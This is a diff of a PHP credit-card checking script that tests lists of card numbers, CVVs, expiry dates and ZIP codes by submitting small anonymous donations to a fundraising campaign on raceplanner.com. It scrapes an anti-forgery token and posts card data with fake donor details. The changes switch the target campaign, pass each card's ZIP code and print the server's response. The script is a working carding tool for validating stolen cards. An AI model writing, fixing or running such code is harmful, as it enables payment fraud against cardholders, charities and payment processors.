@@ -36,7 +36,7 @@ set_time_limit(0);
 function check($ccnum, $ccv2, $moth, $year,$zip=12345,$balance=1)
 {
 
-    define('RACE','Team_MFM5K_Red');
+    define('RACE','JLarkeBudstotheBone');
     define("URL", "https://www.raceplanner.com/fundraisers/donate?ID=".RACE."&donationamount=".$balance);
     define('URLSTEP2','https://www.raceplanner.com/fundraisers/processwizarddonation');
 
@@ -92,6 +92,7 @@ function check($ccnum, $ccv2, $moth, $year,$zip=12345,$balance=1)
    // echo $token;
     define('CAMPID',$camid);
    // echo CAMPID;
+   // return;
     /*
        $url = 'https://www.campaigncontribution.com/v5/process/info.asp';
        $reffer = URL;
@@ -117,7 +118,8 @@ function check($ccnum, $ccv2, $moth, $year,$zip=12345,$balance=1)
     $url = URLSTEP2;
     $reffer = URL;
 //      $POSTFIELDS = "CampaignID=".CAMPID."&DonorID=00000000-0000-0000-0000-000000000000&PageUrl=".RACE."&AntiForgeryToken=".$token."&DonationAmount=".$balance."&ProcessingFee=0&AccountType=3&DonorType=0&MatchingSponsorType=1&EmailAddress=my%40gmail.com&Password=&NewUserName=&NewPassword=&ConfirmEmailAddress=my%40gmail.com&ConfirmPassword=&FirstName=mr&LastName=a&PhoneNumber=&Street1=&Street2=&City=&State=&PostalCode=&Country=US&DisplayName=nguyen++a&HideDonation=true&HideDonationAmount=false&AnonymousDonation=true&HeardAboutMethod=&OrganizationName=&MatchingGiftSponsor=&MessageToOrganizer=&InHonorOf=&InMemoryOf=&NotificationDetails=&NameOnCard=nguyen+a&CardNumber=".$ccnum."&CVC=".$ccv2."&CardExpiration=&ExpireMonth=" .(int)$moth. "&ExpireYear=" .$year. "&BillingSameAsPrimary=false&BillStreet1=abc&BillStreet2=&BillCity=xyz&BillState=AL&BillPostalCode=" .$zip. "&BillCountry=US";;
-      $POSTFIELDS = "CampaignID=".CAMPID."&DonorID=00000000-0000-0000-0000-000000000000&PageUrl=".RACE."&AntiForgeryToken=".$token."&DonationAmount=".$balance."&ProcessingFee=0&AccountType=3&DonorType=0&MatchingSponsorType=1&EmailAddress=a%40gmail.com&Password=&NewUserName=&NewPassword=&ConfirmEmailAddress=a%40gmail.com&ConfirmPassword=&FirstName=mr&LastName=a&PhoneNumber=&Street1=&Street2=&City=&State=&PostalCode=&Country=US&DisplayName=mr+a&HideDonation=true&HideDonationAmount=false&AnonymousDonation=true&HeardAboutMethod=&OrganizationName=&MatchingGiftSponsor=&MessageToOrganizer=&InHonorOf=&InMemoryOf=&NotificationDetails=&NameOnCard=mr+a&CardNumber=".$ccnum."&CVC=".$ccv2."&CardExpiration=&ExpireMonth=" .(int)$moth. "&ExpireYear=" .$year. "&BillingSameAsPrimary=false&BillStreet1=12345&BillStreet2=&BillCity=LA&BillState=AL&BillPostalCode=21212&BillCountry=US";
+      $POSTFIELDS = "CampaignID=".CAMPID."&DonorID=00000000-0000-0000-0000-000000000000&PageUrl=".RACE."&AntiForgeryToken=".$token."&DonationAmount=".$balance."&ProcessingFee=0&AccountType=3&DonorType=0&MatchingSponsorType=1&EmailAddress=a%40gmail.com&Password=&NewUserName=&NewPassword=&ConfirmEmailAddress=a%40gmail.com&ConfirmPassword=&FirstName=mr&LastName=a&PhoneNumber=&Street1=&Street2=&City=&State=&PostalCode=&Country=US&DisplayName=mr+a&HideDonation=true&HideDonationAmount=false&AnonymousDonation=true&HeardAboutMethod=&OrganizationName=&MatchingGiftSponsor=&MessageToOrganizer=&InHonorOf=&InMemoryOf=&NotificationDetails=&NameOnCard=mr+a&CardNumber=".$ccnum."&CVC=".$ccv2."&CardExpiration=&ExpireMonth=" .(int)$moth. "&ExpireYear=" .$year. "&BillingSameAsPrimary=false&BillStreet1=12345&BillStreet2=&BillCity=LA&BillState=AL&BillPostalCode=".$zip."&BillCountry=US";
+	//	$POSTFIELDS = "CampaignID=".CAMPID."&DonorID=00000000-0000-0000-0000-000000000000&PageUrl=".RACE."&AntiForgeryToken=".$token."&DonationAmount=".$balance."&ProcessingFee=0&AccountType=3&DonorType=&MatchingSponsorType=&EmailAddress=a%40gmail.com&Password=&NewUserName=&NewPassword=&ConfirmEmailAddress=a%40gmail.com&ConfirmPassword=&FirstName=mr&LastName=a&PhoneNumber=&Street1=&Street2=&City=&State=&PostalCode=&Country=US&DisplayName=mr+a&HideDonation=true&HideDonationAmount=false&AnonymousDonation=true&HeardAboutMethod=&OrganizationName=&MatchingGiftSponsor=&MessageToOrganizer=&InHonorOf=&InMemoryOf=&NotificationDetails=&NameOnCard=mr+a&CardNumber=".$ccnum."&CVC=".$ccv2."&CardExpiration=&ExpireMonth=" .(int)$moth. "&ExpireYear=" .$year. "&BillingSameAsPrimary=false&BillStreet1=aaaa&BillStreet2=&BillCity=112&BillState=AL&BillPostalCode=12345&BillCountry=US";
 //    echo $POSTFIELDS;
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -135,7 +137,7 @@ function check($ccnum, $ccv2, $moth, $year,$zip=12345,$balance=1)
 //	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
     $result = curl_exec($ch); // grab URL and pass it to the variable.
     curl_close($ch); // close curl resource, and free up system resources.
-//echo $result.PHP_EOL;
+echo $result.PHP_EOL;
 
     $code_ok = 3;
     if (strpos($result, "\"Result\":true")) {
@@ -328,7 +330,7 @@ foreach ($cclist as $ccline) {
             $post = "ACTION=&credit_card=" . $ccnum['type'] . "&card_number=" . $ccnum['num'] . "&card_cvv_number=" . $ccnum['cvv'] . "&MONTH=" . ($ccnum['mon']) . "&YEAR=" . ($ccnum['year']);
             $balance = $_POST['balance'];
 
-            $okokok = check($ccnum['num'], $ccnum['cvv'], $ccnum['mon'], $ccnum['year'],21212,$balance);
+            $okokok = check($ccnum['num'], $ccnum['cvv'], $ccnum['mon'], $ccnum['year'],$ccnum['zip'],$balance);
             //echo $post.'<br>';
 
             $keytype = $key['keytype'];
